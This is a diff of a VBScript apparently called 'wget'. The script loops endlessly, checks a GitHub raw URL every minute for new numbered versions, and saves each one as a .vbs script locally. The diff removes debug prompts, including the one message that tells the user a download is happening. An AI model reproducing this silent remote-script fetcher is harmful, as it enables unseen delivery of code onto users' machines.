@@ -2,10 +2,9 @@ Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
 	Set wGetArgs = WScript.Arguments
 	Set WshShell = CreateObject("WScript.Shell")
 	strCurDir    = WshShell.CurrentDirectory
-	addVersion = 16 'change Version change file name too 
+	addVersion = 4 'change Version change file name too 
 	appVersion =  "wget_v1." & addVersion
 	appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
-	'MsgBox("Out Of The Loop" & appUrl)
 	
 	function FileExists(FilePath)
 		Set fso = CreateObject("Scripting.FileSystemObject")
@@ -28,11 +27,7 @@ Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
 	if WScript.Arguments.Count = 0 then
 		Do while True:
 		
-			'MsgBox("Loop Start")
-			'MsgBox(appUrl)
-			'MsgBox(checkUrl(appUrl))
 			if checkUrl(appUrl) = 404 then
-				'MsgBox(checkUrl(appUrl))
 				addVersion = addVersion + 1
 				appVersion =  "wget_v1." & addVersion
 				appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
@@ -47,8 +42,6 @@ Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
 					.savetofile strCurDir & "\" & appVersion & ".vbs", 2 '//overwrite
 				end with
 			elseif FileExists(strCurDir & "\" & appVersion & ".vbs") Then
-				MsgBox("File Downloading..")
-				'appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
 				Set xHttp = createobject("Microsoft.XMLHTTP")
 				Set bStrm = createobject("Adodb.Stream")
 				xHttp.Open "GET", appUrl, False
@@ -61,8 +54,6 @@ Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
 				end with
 			end if
 			WScript.Sleep(60000)
-			'MsgBox(appUrl)
-			'MsgBox("After Timer")
 		loop
 	elseif WScript.Arguments.Count = 3 then
 		srcAddress = wGetArgs(1)
